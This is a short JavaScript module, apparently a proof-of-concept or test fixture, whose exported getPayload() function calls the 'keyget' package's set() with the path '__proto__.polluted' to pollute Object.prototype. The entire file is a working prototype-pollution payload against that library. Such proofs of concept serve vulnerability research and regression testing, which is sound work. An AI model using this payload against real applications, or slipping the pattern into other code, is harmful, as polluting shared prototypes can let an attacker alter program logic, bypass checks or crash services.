function getPayload() {
    var keyget = require("keyget");
    var obj = {};

    keyget.set({}, "__proto__.polluted", "yes");

    return { obj };
}

module.exports = { getPayload };